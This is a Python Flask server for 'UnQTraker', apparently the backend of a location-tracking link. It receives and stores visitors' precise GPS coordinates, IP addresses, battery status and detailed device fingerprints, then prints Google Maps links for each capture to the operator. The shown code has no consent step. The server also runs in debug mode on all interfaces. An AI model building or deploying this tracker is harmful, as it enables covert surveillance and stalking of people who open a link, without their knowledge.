#!/usr/bin/env python3
"""
UnQTraker - Advanced Location Intelligence System
Professional geolocation tracking with enhanced admin management
"""

from flask import Flask, render_template, request, jsonify, abort
from datetime import datetime
import json
import os
from pathlib import Path

app = Flask(__name__)
app.config['SECRET_KEY'] = os.urandom(24)
app.config['JSON_AS_ASCII'] = False

# Storage directory for location data
DATA_DIR = Path('data')
DATA_DIR.mkdir(exist_ok=True)
LOCATIONS_FILE = DATA_DIR / 'locations.json'

def load_locations():
    """Load location data from JSON file"""
    if LOCATIONS_FILE.exists():
        try:
            with open(LOCATIONS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
        except:
            return []
    return []

def save_location(data):
    """Save location data to JSON file"""
    locations = load_locations()
    locations.append(data)
    
    # Keep only last 200 locations for better tracking history
    if len(locations) > 200:
        locations = locations[-200:]
    
    with open(LOCATIONS_FILE, 'w', encoding='utf-8') as f:
        json.dump(locations, f, indent=2, ensure_ascii=False)

def is_localhost(request):
    """Check if request is from localhost"""
    remote_addr = request.remote_addr
    allowed_hosts = ['127.0.0.1', 'localhost', '::1']
    return remote_addr in allowed_hosts

@app.route('/')
def index():
    """Main tracking page"""
    return render_template('index.html')

@app.route('/admin')
def admin():
    """Admin dashboard - localhost only access"""
    # Security: Only allow localhost access
    if not is_localhost(request):
        abort(403)  # Forbidden
    
    locations = load_locations()
    return render_template('admin.html', locations=locations)

@app.route('/api/location', methods=['POST'])
def receive_location():
    """API endpoint to receive location data"""
    try:
        data = request.get_json()
        
        # Extract comprehensive location and device data
        location_data = {
            'timestamp': datetime.now().isoformat(),
            'latitude': data.get('latitude'),
            'longitude': data.get('longitude'),
            'accuracy': data.get('accuracy'),
            'altitude': data.get('altitude'),
            'altitude_accuracy': data.get('altitudeAccuracy'),
            'heading': data.get('heading'),
            'speed': data.get('speed'),
            'device_info': {
                'user_agent': request.headers.get('User-Agent'),
                'ip_address': request.remote_addr,
                'browser': data.get('browser'),
                'browser_version': data.get('browser_version'),
                'os': data.get('os'),
                'os_version': data.get('os_version'),
                'device_type': data.get('device_type'),
                'device_vendor': data.get('device_vendor'),
                'device_model': data.get('device_model'),
                'screen_width': data.get('screen_width'),
                'screen_height': data.get('screen_height'),
                'screen_resolution': data.get('screen_resolution'),
                'color_depth': data.get('color_depth'),
                'pixel_ratio': data.get('pixel_ratio'),
                'language': data.get('language'),
                'languages': data.get('languages'),
                'timezone': data.get('timezone'),
                'timezone_offset': data.get('timezone_offset'),
                'platform': data.get('platform'),
                'cookie_enabled': data.get('cookie_enabled'),
                'online_status': data.get('online_status'),
                'connection_type': data.get('connection_type'),
                'battery_level': data.get('battery_level'),
                'battery_charging': data.get('battery_charging'),
                'referrer': request.headers.get('Referer', 'Direct'),
                'touch_support': data.get('touch_support'),
                'cores': data.get('cores'),
                'memory': data.get('memory')
            },
            'session_id': data.get('session_id')
        }
        
        # Save to file
        save_location(location_data)
        
        # Enhanced console logging
        print(f"\n{'='*70}")
        print(f"📍 UNQTRAKER - NEW LOCATION CAPTURED")
        print(f"{'='*70}")
        print(f"⏰ Time: {location_data['timestamp']}")
        print(f"🌍 Location: {location_data['latitude']:.6f}, {location_data['longitude']:.6f}")
        print(f"🎯 Accuracy: {location_data['accuracy']}m")
        print(f"📱 Device: {location_data['device_info']['device_type']} - {location_data['device_info']['device_vendor']} {location_data['device_info']['device_model']}")
        print(f"💻 Browser: {location_data['device_info']['browser']} {location_data['device_info']['browser_version']}")
        print(f"🖥️  OS: {location_data['device_info']['os']} {location_data['device_info']['os_version']}")
        print(f"📶 IP: {location_data['device_info']['ip_address']}")
        print(f"🔋 Battery: {location_data['device_info']['battery_level']}% {'(Charging)' if location_data['device_info']['battery_charging'] else '(Not Charging)'}")
        print(f"🗺️  Google Maps: https://www.google.com/maps?q={location_data['latitude']},{location_data['longitude']}")
        print(f"{'='*70}\n")
        
        return jsonify({
            'status': 'success',
            'message': 'Location tracked successfully',
            'data': location_data
        }), 200
        
    except Exception as e:
        print(f"❌ Error receiving location: {str(e)}")
        return jsonify({
            'status': 'error',
            'message': str(e)
        }), 400

@app.route('/api/locations', methods=['GET'])
def get_locations():
    """API endpoint to retrieve all stored locations - localhost only"""
    if not is_localhost(request):
        abort(403)
    
    locations = load_locations()
    return jsonify({
        'status': 'success',
        'count': len(locations),
        'locations': locations
    })

@app.route('/api/latest', methods=['GET'])
def get_latest():
    """API endpoint to get the latest location - localhost only"""
    if not is_localhost(request):
        abort(403)
        
    locations = load_locations()
    if locations:
        return jsonify({
            'status': 'success',
            'location': locations[-1]
        })
    return jsonify({
        'status': 'error',
        'message': 'No locations found'
    }), 404

@app.route('/api/stats', methods=['GET'])
def get_stats():
    """API endpoint for statistics - localhost only"""
    if not is_localhost(request):
        abort(403)
        
    locations = load_locations()
    
    if not locations:
        return jsonify({
            'status': 'success',
            'total_locations': 0,
            'unique_devices': 0,
            'unique_ips': 0
        })
    
    unique_ips = len(set(loc['device_info']['ip_address'] for loc in locations if loc.get('device_info', {}).get('ip_address')))
    unique_sessions = len(set(loc.get('session_id') for loc in locations if loc.get('session_id')))
    
    return jsonify({
        'status': 'success',
        'total_locations': len(locations),
        'unique_sessions': unique_sessions,
        'unique_ips': unique_ips,
        'latest_timestamp': locations[-1]['timestamp'] if locations else None
    })

@app.route('/health')
def health():
    """Health check endpoint"""
    return jsonify({
        'status': 'healthy',
        'app': 'UnQTraker',
        'version': '2.0',
        'timestamp': datetime.now().isoformat(),
        'total_locations': len(load_locations())
    })

@app.errorhandler(403)
def forbidden(e):
    """Custom 403 error handler"""
    return jsonify({
        'error': 'Access Denied',
        'message': 'This resource is only accessible from localhost'
    }), 403

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🚀 UNQTRAKER - Advanced Location Intelligence System")
    print("="*70)
    print("📍 Location tracking server is running")
    print("🌐 Public tracker: http://localhost:5000")
    print("👨‍💼 Admin dashboard: http://localhost:5000/admin (localhost only)")
    print("")
    print("📊 API Endpoints (localhost only):")
    print("   - POST /api/location - Receive location data")
    print("   - GET  /api/locations - Get all locations")
    print("   - GET  /api/latest - Get latest location")
    print("   - GET  /api/stats - Get statistics")
    print("")
    print("🔒 Security: Admin access restricted to localhost only")
    print("="*70 + "\n")
    
    app.run(host='0.0.0.0', port=5000, debug=True)